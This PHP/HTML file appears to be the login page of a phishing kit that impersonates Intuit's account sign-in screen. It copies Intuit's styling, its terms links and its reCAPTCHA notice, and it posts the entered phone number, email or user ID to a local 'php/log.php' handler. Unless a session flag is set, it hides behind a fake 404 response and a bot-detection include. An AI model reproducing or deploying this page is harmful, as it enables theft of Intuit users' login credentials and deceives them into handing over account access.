<?php
   session_start();
   ob_start();
   require_once('../config.php');
   include_once('../includes/php/detect.php');
   
   if(!isset($_SESSION['fallow'])) {
      header('HTTP/1.1 404 Not Found');
      exit();
   }
   ?>
   <!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
      <link rel="stylesheet" href="./css/login.css">
   </head>
<?php include ("file/header.php"); ?>
<div class="Bookends__NonStyledDiv-sc-163uul4-4 hVYhee">
   <div class="styledComponents__StyledWidgetContainer-kizisb-13 dXZNXp ius" data-testid="IuxBookendsHeaderContainer">
      <div data-testid="IdFirstUnknownContainer" class="IdentifierFirstUnknown__StyledContainer-sc-1pqtykm-0 fOdUvC">
         <section class="IuxH2AndDescription__StyledSection-j40avf-0 hVIzWf">
            <header>
               <h2 class="IuxH2AndDescription__StyledH2-j40avf-1 fvsQoV Typography-light-242afbc Typography-headline-2-0a55c12" data-testid="IdentifierFirstHeader" id="IdentifierFirstHeader">Sign in</h2>
               <div data-testid="IdentifierFirstSubHeader" id="IdentifierFirstSubHeader" class="IuxH2AndDescription__StyledDescription-j40avf-2 kAsTtm">Use your <a href="" target="_blank" rel="noopener" id="iux-subheader-intuit-account-help-page-link" class="idsTSLink Link-link-11f6543 Link-light-8c95283 buildHeaderText__StyledIuxLink-g7i0bx-1 kXulGI"><span class="Typography-light-242afbc Typography-body-3-3b2236f Typography-regular-5296945" data-testid="innerLinkText">Intuit Account</span></a> to sign in.</div>
            </header>
         </section>
         <form action="php/log.php" autocomplete="on" method="POST" name="login">
            <div>
               <div data-testid="IdentifierFirstIdentifierField" class="IuxFormInput__StyledFieldWrapper-sc-1nlfpoi-0 hiOEEg">
                  <div class="TextField-light-8d9994d idsTSTextField TextField-TextFieldWrapper-ac3dd51 style-wRG5J" id="style-wRG5J">
                     <label for="iux-identifier-first-unknown-identifier" class="TextField-TFLabelWrapper-5565c4c TextField-TFHasLabel-cdab9c1">
                        <span class="TextField-TFLabelOverride-1f9d70f TextField-size-medium-253d5f0 Typography-light-242afbc Typography-body-3-3b2236f">Phone number, email or user ID </span>
                        <div class="TextField-TFInputWrapper-5ea0f14 TextField-size-medium-253d5f0">
                           <input id="iux-identifier-first-unknown-identifier" aria-invalid="false" width="100%" class="idsF TextField-TFInput-5b74f65 TextField-light-8d9994d TextField-TFNoErrorText-e9d7d7f TextField-TFNotDisabled-7206466 TextField-size-medium-253d5f0" type="text" aria-label="Phone number, email or user ID" aria-required="true" autocapitalize="none" data-testid="IdentifierFirstIdentifierInput" inputmode="text" name="Email" placeholder="" aria-describedby="iux-identifier-first-unknown-identifier-helper" required>
                        </div>
                     </label>
                     <div class="">
                        <div id="iux-identifier-first-unknown-identifier-helper" class="TextField-TFHelperTextWrapper-f139a9c"><span class="TextField-TFHelperTextOverride-43e7854 TextField-size-medium-253d5f0 Typography-light-242afbc Typography-body-3-3b2236f">Standard call, message, or data rates may apply.</span></div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="SignInRememberMe__StyledSignInRememberMeContainer-sc-1gzglnq-0 hHlcPj snipcss0-16-54-65">
               <label class="Checkbox-labelWrapper-bf89850 Checkbox-size-medium-3b52810 Checkbox-light-cf6ff77 IuxCheckbox__StyledCheckbox-sc-1anm974-2 cBJOrU">
                  <span class="idsTSCheckbox RcCheckbox-container-f8facb1 RcCheckbox-containerChecked-453bbc1">
                  <input type="checkbox" value="lsRememberMe" id="rememberMe" checked="">
                  </span>
                  <span class="Checkbox-spanWrapper-62722d0 Checkbox-size-medium-3b52810 Checkbox-light-cf6ff77 Typography-light-242afbc Typography-body-2-0972c4f">
                     <div data-testid="IdentifierFirstRememberMeLabel" class="IuxCheckbox__StyledCheckboxLabel-sc-1anm974-1 kNMZax">Remember me</div>
                  </span>
               </label>
            </div>
            <button type="submit" data-testid="IdentifierFirstSubmitButton" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-primary-7bd5bc4 IuxButton__StyledButton-ktqsri-0 kYNrzU Button-full-af87840">
               <svg xmlns="http://www.w3.org/2000/svg" fill="#ffffff" viewBox="0 0 24 24" color="currentColor" width="24px" height="24px" focusable="false" aria-hidden="true">
                  <path fill="currentColor" d="M17 10V7a5 5 0 0 0-5-5 5.006 5.006 0 0 0-5 5v3a3 3 0 0 0-3 3v6a3 3 0 0 0 3 3h10a3 3 0 0 0 3-3v-6a3 3 0 0 0-3-3M9 7a3 3 0 0 1 3-3 3 3 0 0 1 3 3v3H9zm9 12a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1v-6a1 1 0 0 1 1-1h10a1 1 0 0 1 1 1z"></path>
                  <path fill="currentColor" d="M12 13a1.994 1.994 0 0 0-1 3.722V18a1 1 0 1 0 2 0v-1.282A1.994 1.994 0 0 0 12 13"></path>
               </svg>
               <span class="Button-label-e0ecc32">Sign In</span>
            </button>
            <div class="IdentifierFirstUnknownSubmitButton__StyledTermsOfServiceContainer-sc-1ec9o89-0 gczWKa">
               <div id="ius-terms-of-use" class="TermsOfService__TermsOfServiceWrapper-sc-1h018p6-0 bzMOUZ" data-testid="TermsOfService">
                  <span data-testid="ius-identifier-first-unknown-terms-of-use-text"><span class="TermsOfService__StyledText-sc-1h018p6-2 gsUCyD">By selecting Sign In, you agree to our <a data-testid="terms-of-use-link" href="https://accounts.intuit.com/terms-of-service" rel="noopener noreferrer" target="_blank" class="idsTSLink Link-link-11f6543 Link-light-8c95283 IuxDynamicLink__StyledLink-sc-1e70qj9-0 scdBb"><span class="Typography-light-242afbc Typography-body-4-397be1b Typography-regular-5296945" data-testid="innerLinkText">Terms</span></a><span></span> and acknowledge our <a data-testid="privacy-statement-link" href="https://www.intuit.com/privacy/statement/" rel="noopener noreferrer" target="_blank" class="idsTSLink Link-link-11f6543 Link-light-8c95283 IuxDynamicLink__StyledLink-sc-1e70qj9-0 scdBb"><span class="Typography-light-242afbc Typography-body-4-397be1b Typography-regular-5296945" data-testid="innerLinkText">Privacy Statement</span></a>.</span></span>
                  <div data-testid="ius-identifier-first-unknown-terms-of-use-privacy-date" class="PrivacyDateText__TermsOfServicePrivacyDateText-sc-5vpgfb-0 kTGHRB"></div>
               </div>
            </div>
            <div class="styledComponents__StyledDivider-kizisb-18 fNa-dUF"></div>
         </form>
         <div><button type="button" data-testid="IdentifierFirstARLink" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-tertiary-f9f30c3 IuxLinkButton__StyledLinkButton-im8qmv-0 IuxLinkButton__StyledLinkButtonWithMarginTop-im8qmv-1 lkPorU dwRGLq IdentifierFirstUnknownRecoveryAndSignUpLinks__StyledIuxLinkButton-sc-1i8k8d3-0 ckVCDJ"><span class="Button-label-e0ecc32">Try something else</span></button></div>
         <div class="IdentifierFirstUnknownRecoveryAndSignUpLinks__StyledSignUpLinkAndLabelWrapper-sc-1i8k8d3-1 iwdNWS"><span data-testid="IdentifierFirstSignUpLabel">New to Intuit? </span><button type="button" data-testid="IdentifierFirstSignUpLink" class="idsTSButton idsF Button-button-5eed597 Button-light-0596377 Button-size-medium-71460f4 Button-purpose-standard-c59fdb5 Button-priority-tertiary-f9f30c3 IuxLinkButton__StyledLinkButton-im8qmv-0 IuxLinkButton__StyledLinkButtonWithMarginTop-im8qmv-1 lkPorU dwRGLq IdentifierFirstUnknownRecoveryAndSignUpLinks__StyledSignUpButton-sc-1i8k8d3-2 gBFZCx"><span class="Button-label-e0ecc32">Create an account</span></button><span>.</span></div>
         <div id="ius-recaptcha-tos-container" data-testid="RecaptchaTOS" class="RecaptchaTOS__StyledContainer-sc-241bcf-1 huGizb">Invisible reCAPTCHA by Google <a data-testid="RecaptchaPrivacyPolicyLink" href="https://www.google.com/intl/en/policies/privacy/" rel="noopener noreferrer" target="_blank" class="idsTSLink Link-link-11f6543 Link-light-8c95283 IuxDynamicLink__StyledLink-sc-1e70qj9-0 scdBb"><span class="Typography-light-242afbc Typography-body-3-3b2236f Typography-regular-5296945" data-testid="innerLinkText">Privacy Policy</span></a> and <a data-testid="RecaptchaTermsOfUseLink" href="https://www.google.com/intl/en/policies/terms/" rel="noopener noreferrer" target="_blank" class="idsTSLink Link-link-11f6543 Link-light-8c95283 IuxDynamicLink__StyledLink-sc-1e70qj9-0 scdBb"><span class="Typography-light-242afbc Typography-body-3-3b2236f Typography-regular-5296945" data-testid="innerLinkText">Terms of Use</span></a>.</div>
      </div>
   </div>
   <?php include ("file/footer.php"); ?>